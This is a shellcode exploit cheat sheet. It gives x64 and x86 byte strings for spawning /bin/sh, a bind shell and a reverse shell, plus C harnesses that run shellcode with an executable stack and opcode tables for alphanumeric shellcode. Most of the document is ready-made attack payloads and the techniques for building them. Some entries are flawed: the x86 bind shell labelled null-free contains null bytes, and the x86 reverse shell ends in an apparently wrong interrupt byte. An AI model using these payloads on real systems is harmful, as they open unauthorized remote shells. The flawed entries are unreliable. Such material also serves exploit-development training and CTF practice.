# Exploit-Cheatsheet

## Shellcode

### `x64`

#### Common techniques

* prevent null byte
    * Use existing values from registers/stack
        * e.g. if initially `rdi` is already 0, `xor rdi, rdi` becomes redundant
    * `xor rax, rax`: zero out `rax`, no null byte opcode
    * `mov rax, 0x30` → `push 0x30; pop rax`
    * `push 0x697a0002` → `push word 0x697a; push word 0x2`
* shorter opcode:
    * `cdq` (1 byte): zero out `rdx` if `rax >= 0`
    * `imul esi` (2 bytes): zero out `rdx` if `rsi == 0`
    * `push 0x30; pop rax` (3 bytes) → `mov al, 0x30`
    * `add eax, 1` (3 bytes), `inc rax` (3 bytes) → `inc eax` (2 bytes), `add al, 1` (2 bytes)
    * `xchg` (2 bytes)
* Caveats
    * if `eax == 0x000000ff`, then after `add al, 1`, `eax == 0x00000000`
        * use `inc ax`, `inc eax`, `inc rax` instead if you want `eax == 0x00000100`
    * `mov [m64], imm64` is not possible
        * e.g., `mov [rax], 0x68732f2f6e69622f` is not possible
        * Change to `mov rbx, 0x68732f2f6e69622f; mov [rax], rbx`

#### Example

* `execve("/bin/sh", NULL, NULL)`
    * Null Free, 22 Bytes
        * `"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05"`
        * [source](shellcode/x64/execve_null_free.s)
* Bind shell
    * Null Free, 74 bytes
        * `"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xb0\x31\x52\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\x0f\x05\xb0\x32\x31\xf6\x0f\x05\xb0\x2b\x99\x0f\x05\x48\x97\x89\xfe\xb0\x21\x0f\x05\xff\xce\x79\xf8\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x99\xb0\x3b\x0f\x05"`
        * [source](shellcode/x64/bind_null_free.s)
* Reverse shell
    * Null Free, 65 bytes
        * `"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x89\xfe\xb0\x21\x0f\x05\xff\xce\x79\xf8\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x99\xb0\x3b\x0f\x05"`
        * [source](shellcode/x64/reverse_null_free.s)

### `x86`

* `execve("/bin/sh", NULL, NULL)`
    * Null Free, 22 Bytes
        * `"\x31\xc0\x31\xc9\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x34\x0b\xcd\x80"`
        * [source](shellcode/x86/execve_null_free.s)
* Bind Shell
    * Null Free, 90 bytes
        * `"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x68\x7a\x69\x00\x00\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"`
        * [source](shellcode/x86/bind_null_free.s)
* Reverse shell
    * Null Free, 66 bytes
        * `"\x6a\x66\x58\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x2b\x67\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x08"`
        * [source](shellcode/x86/reverse_null_free.s)

#### Shellcode Testing
* From string
Source (`sc.c`)
```c
int main() {
    char shellcode[] = ""; // shellcode
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* From file
```c
#include <stdio.h>
#include <stdlib.h>
#define SHELLCODE_LENGTH 4096
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "usage: ./shellcode_test [BINARY FILE]");
        exit(EXIT_FAILURE);
    }
    char shellcode[SHELLCODE_LENGTH]; // shellcode
    FILE *fp = fopen(argv[1], "rb");
    if (fp == NULL) {
        fprintf(stderr, "Cannot open file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    fread(shellcode, SHELLCODE_LENGTH, 1, fp);
    if (ferror(fp)) {
        fprintf(stderr, "Cannot read file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* Compile
```bash
gcc sc.c -z execstack -o sc
```

### Alphanumeric Shellcode

#### x64

* Prefixes
    <details>
    <summary>Expand</summary>

    | Opcode | Prefix Description | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `f` | 16-bit operand size | `push rax` → `push ax` | `P` → `fP` |
    | `g` | 16-bit address size | `xor [rax], dh` → `xor [eax], dh` | `00` → `g00` |
    | `H` | 64-bit register size override | `xor eax, 0x30303030` → `xor rax, 0x30303030` | `50000` → `H50000` |
    | `6` | ss segment override | `xor [rcx+0x30], rax` → `xor [ss:rcx+0x30], rax` | `H1A0` →`6H1A0` |
    | `d` | fs segment override | `xor rax, [rcx+0x30]` → `xor rax, [fs:rcx+0x30]` | `H3A0` → `dH3A0` |
    | `e` | gs segment override | `xor rax, [rcx+0x30]` → `xor rax, [gs:rcx+0x30]` | `H3A0` → `eH3A0` |
    </details>
* Operands
    <details>
    <summary>Expand</summary>

    * Layer 1
        | Operand | Changed register | Changed Memory |
        | - | - | - |
        | `0` | `esi` | `[rax]` |
        | `1` | `esi` | `[rcx]` |
        | `2` | `esi` | `[rdx]` |
        | `3` | `esi` | `[rbx]` |
        | `4*` | `esi` | `[*]` |
        | `5####` | `esi` | `[rip + ####]` |
        | `6` | `esi` | `[rsi]` |
        | `7` | `esi` | `[rdi]` |
        | `8` | `edi` | `[rax]` |
        | `9` | `edi` | `[rcx]` |
        | `A#` | `eax` | `[rcx + #]` |
        | `B#` | `eax` | `[rdx + #]` |
        | `C#` | `eax` | `[rbx + #]` |
        | `D*#` | `eax` | `[* + #]` |
        | `E#` | `eax` | `[rbp + #]` |
        | `F#` | `eax` | `[rsi + #]` |
        | `G#` | `eax` | `[rdi + #]` |
        | `H#` | `ecx` | `[rax + #]` |
        | `I#` | `ecx` | `[rcx + #]` |
        | `J#` | `ecx` | `[rdx + #]` |
        | `K#` | `ecx` | `[rbx + #]` |
        | `L*#` | `ecx` | `[* + #]` |
        | `M#` | `ecx` | `[rbp + #]` |
        | `N#` | `ecx` | `[rsi + #]` |
        | `O#` | `ecx` | `[rdi + #]` |
        | `P#` | `edx` | `[rax + #]` |
        | `Q#` | `edx` | `[rcx + #]` |
        | `R#` | `edx` | `[rdx + #]` |
        | `S#` | `edx` | `[rbx + #]` |
        | `T*#` | `ecx` | `[* + #]` |
        | `U#` | `edx` | `[rbp + #]` |
        | `V#` | `edx` | `[rsi + #]` |
        | `W#` | `edx` | `[rdi + #]` |
        | `X#` | `ebx` | `[rax + #]` |
        | `Y#` | `ebx` | `[rcx + #]` |
        | `Z#` | `ebx` | `[rdx + #]` |
        | `a#` | `esp` | `[rcx + #]` |
        | `b#` | `esp` | `[rdx + #]` |
        | `c#` | `esp` | `[rbx + #]` |
        | `d*#` | `esp` | `[* + #]` |
        | `e#` | `esp` | `[rbp + #]` |
        | `f#` | `esp` | `[rsi + #]` |
        | `g#` | `esp` | `[rdi + #]` |
        | `h#` | `ebp` | `[rax + #]` |
        | `i#` | `ebp` | `[rcx + #]` |
        | `j#` | `ebp` | `[rdx + #]` |
        | `k#` | `ebp` | `[rbx + #]` |
        | `l*#` | `ebp` | `[* + #]` |
        | `m#` | `ebp` | `[rbp + #]` |
        | `n#` | `ebp` | `[rsi + #]` |
        | `o#` | `ebp` | `[rdi + #]` |
        | `p#` | `esi` | `[rax + #]` |
        | `q#` | `esi` | `[rcx + #]` |
        | `r#` | `esi` | `[rdx + #]` |
        | `s#` | `esi` | `[rbx + #]` |
        | `t*#` | `esi` | `[* + #]` |
        | `u#` | `esi` | `[rbp + #]` |
        | `v#` | `esi` | `[rsi + #]` |
        | `w#` | `esi` | `[rdi + #]` |
        | `x#` | `edi` | `[rax + #]` |
        | `y#` | `edi` | `[rcx + #]` |
        | `z#` | `edi` | `[rdx + #]` |
    * Layer 2
        | Operand | Changed register |
        | - | - |
        | `*0` | `rax + rsi` |
        | `*1` | `rcx + rsi` |
        | `*2` | `rdx + rsi` |
        | `*3` | `rbx + rsi` |
        | `*4` | `rsp + rsi` |
        | `*5` | `rbp + rsi` |
        | `*6` | `rsi + rsi` |
        | `*7` | `rdi + rsi` |
        | `*8` | `rax + rdi` |
        | `*9` | `rcx + rdi` |
        | `*A` | `rcx + rax*2` |
        | `*B` | `rdx + rax*2` |
        | `*C` | `rbx + rax*2` |
        | `*D` | `rsp + rax*2` |
        | `*E` | `rbp + rax*2` |
        | `*F` | `rsi + rax*2` |
        | `*G` | `rdi + rax*2` |
        | `*H` | `rax + rcx*2` |
        | `*I` | `rcx + rcx*2` |
        | `*J` | `rdx + rcx*2` |
        | `*K` | `rbx + rcx*2` |
        | `*L` | `rsp + rcx*2` |
        | `*M` | `rbp + rcx*2` |
        | `*N` | `rsi + rcx*2` |
        | `*O` | `rdi + rcx*2` |
        | `*P` | `rax + rdx*2` |
        | `*Q` | `rcx + rdx*2` |
        | `*R` | `rdx + rdx*2` |
        | `*S` | `rbx + rdx*2` |
        | `*T` | `rsp + rdx*2` |
        | `*U` | `rbp + rdx*2` |
        | `*V` | `rsi + rdx*2` |
        | `*W` | `rdi + rdx*2` |
        | `*X` | `rax + rbx*2` |
        | `*Y` | `rcx + rbx*2` |
        | `*Z` | `rdx + rbx*2` |
        | `*h` | `rax + rbp*2` |
        | `*i` | `rcx + rbp*2` |
        | `*j` | `rdx + rbp*2` |
        | `*k` | `rbx + rbp*2` |
        | `*l` | `rsp + rbp*2` |
        | `*m` | `rbp + rbp*2` |
        | `*n` | `rsi + rbp*2` |
        | `*o` | `rdi + rbp*2` |
        | `*p` | `rax + rsi*2` |
        | `*q` | `rcx + rsi*2` |
        | `*r` | `rdx + rsi*2` |
        | `*s` | `rbx + rsi*2` |
        | `*t` | `rsp + rsi*2` |
        | `*u` | `rbp + rsi*2` |
        | `*v` | `rsi + rsi*2` |
        | `*w` | `rdi + rsi*2` |
        | `*x` | `rax + rdi*2` |
        | `*y` | `rcx + rdi*2` |
        | `*z` | `rdx + rdi*2` |
    * Example
        | Instruction | Opcode |
        | - | - |
        | `xor byte ptr [rax], dh` | `00` |
        | `xor byte ptr [rax + rsi], dh` | `040` |
        | `xor byte ptr [rcx + 0x30], al` | `0A0` |
        | `xor byte ptr [rax + rsi + 0x30], al` | `0D00` |
        | `xor byte ptr [rcx + rax*2 + 0x30], al` | `0DA0` |
    </details>

* `push`
    | Instruction | Opcode | Instruction | Opcode |
    | - | - | - | - |
    | `push rax` | `P` | `push ax` | `fP` |
    | `push rcx` | `Q` | `push cx` | `fQ` |
    | `push rdx` | `R` | `push dx` | `fR` |
    | `push rbx` | `S` | `push bx` | `fS` |
    | `push rsp` | `T` | `push sp` | `fT` |
    | `push rbp` | `U` | `push bp` | `fU` |
    | `push rsi` | `V` | `push si` | `fV` |
    | `push rdi` | `W` | `push di` | `fW` |
    | `push r8` | `AP` | `push r8w` | `fAP` |
    | `push r9` | `AQ` | `push r9w` | `fAQ` |
    | `push r10` | `AR` | `push r10w` | `fAR` |
    | `push r11` | `AS` | `push r11w` | `fAS` |
    | `push r12` | `AT` | `push r12w` | `fAT` |
    | `push r13` | `AU` | `push r13w` | `fAU` |
    | `push r14` | `AV` | `push r14w` | `fAV` |
    | `push r15` | `AW` | `push r15w` | `fAW` |
    | `push byte 0x30 ` | `j0` |
    | `push word 0x3030` | `fh00` |
    | `push 0x30303030` | `h0000` |
* `pop`
    | Instruction | Opcode |
    | - | - |
    | `pop rax` | `X` | `pop ax` | `fX` |
    | `pop rcx` | `Y` | `pop cx` | `fY` |
    | `pop rdx` | `Z` | `pop dx` | `fZ` |
    | `pop r8` | `AX` | `pop r8w` | `fAX` |
    | `pop r9` | `AY` | `pop r9w` | `fAY` |
    | `pop r10` | `AZ` | `pop r10w` | `fAZ` |
* `xor`
    | Instruction | Opcode | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `xor al, imm8` | `4#` | `xor al, 0x30` | `40` |
    | `xor ax, imm16` | `f5##` | `xor ax, 0x3030` | `f500` |
    | `xor eax, imm32` | `5####` | `xor eax, 0x30303030` | `50000` |
    | `xor rax, imm32` | `H5####` | `xor rax, 0x30303030` | `H50000` |
    | `xor m64, r8` | `0*` | `xor byte ptr [rcx + 0x30], al` | `0A0` |
    | `xor m64, r8` | `1*` | `xor dword ptr [rax + rsi + 0x30], eax` | `1D00` |
    | `xor r8, m64` | `2*` | `xor al, byte ptr [rcx + 0x4f]` | `2A0` |
    | `xor r8, m64` | `3*` | `xor dword ptr eax, [rax + rsi + 0x30]` | `3D00` |

* `imul`
    | Instruction | Opcode | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `imul r32, m32, imm8` | `k?#` | `imul esi, dword ptr [rsi], 0x30` | `k60` |
    | `imul r32, m32, imm32` | `i?####` | `imul esi, dword ptr [rdx], 0x30303030` | `i20000` |

#### Reference
[x64 alphanumeric shellcode](https://nets.ec/Alphanumeric_shellcode)

### Resource

#### Opcode Table
[x86](https://shell-storm.org/x86doc/)
[x64](http://ref.x86asm.net/coder64.html)

#### Syscall Table
[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

#### Database
[shell-storm shellcode database](https://shell-storm.org/shellcode/)
[exploit-db shellcodes](https://www.exploit-db.com/shellcodes)


